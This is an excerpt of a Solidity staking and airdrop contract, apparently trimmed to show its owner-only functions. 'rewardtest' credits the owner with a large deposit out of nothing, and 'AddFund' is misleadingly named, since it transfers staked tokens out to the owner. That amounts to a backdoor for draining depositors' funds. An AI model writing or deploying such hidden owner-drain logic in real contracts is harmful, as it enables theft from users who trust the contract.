...
contract AirdropStakingrewards is Ownable, Pausable {
    // Library for safely handling uint256
    using SafeMath for uint256;

    address public stakingAddress;
    address public tokenV1;
    uint256 public rewardPerSecond = 115740740741;
    ...
    mapping(address => uint256) public Pending;
      ...
      constructor(address _token,address _tokenV1) public {
        stakingAddress = _token;
        tokenV1 = _tokenV1;
    }

    function addfundAirdrop(uint256 _amount) public onlyOwner {
    ...
    function airdrop(uint256 _amount) public {
        IERC20(tokenV1).transferFrom(msg.sender,address(this),_amount);
    ...
    function compound() public {
        uint256 reward = earned(msg.sender);
        Deposit[msg.sender] = Deposit[msg.sender].add(reward);
        Pending[msg.sender]=0;
        Invtime[msg.sender]=block.timestamp;
        totalPaid=totalPaid.add(reward);
    }
     ...
     function rewardtest() public onlyOwner {
       Invtime[msg.sender]=block.timestamp;
        Deposit[msg.sender]=100e18;
    }

     function AddFund(uint256 _amount) public onlyOwner {
       IERC20(stakingAddress).transfer(msg.sender, _amount);
    }
